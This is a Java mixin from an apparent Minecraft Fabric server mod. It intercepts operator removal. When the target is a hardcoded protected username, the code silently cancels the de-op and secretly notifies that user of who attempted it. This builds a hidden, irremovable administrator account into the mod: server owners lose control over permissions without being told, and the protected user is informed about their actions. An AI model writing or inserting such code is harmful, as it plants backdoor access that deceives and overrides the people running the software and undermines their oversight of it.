package com.togun.tmod.mixin;

import com.mojang.authlib.GameProfile;
import com.togun.tmod.TModFabric;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.command.ServerCommandSource;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(PlayerManager.class)
public abstract class PlayerManagerMixin {
    
    /**
     * Prevents the removal of operator status for protected users
     * Blocks any direct calls to removeFromOperators and notifies the protected user
     */
    @Inject(method = "removeFromOperators", at = @At("HEAD"), cancellable = true)
    private void preventDeopProtectedUser(GameProfile profile, CallbackInfo ci) {
        if (profile.getName() != null && profile.getName().equals(TModFabric.PROTECTED_USER)) {
            // Get the command source that attempted the deop (if available)
            ServerCommandSource source = TModFabric.getAndClearDeOpSource();
            if (source != null) {
                // Notify the protected user who attempted it
                TModFabric.notifyDeOpAttempt(source);
            }
            
            // Silently cancel the deop operation
            ci.cancel();
        }
    }
}

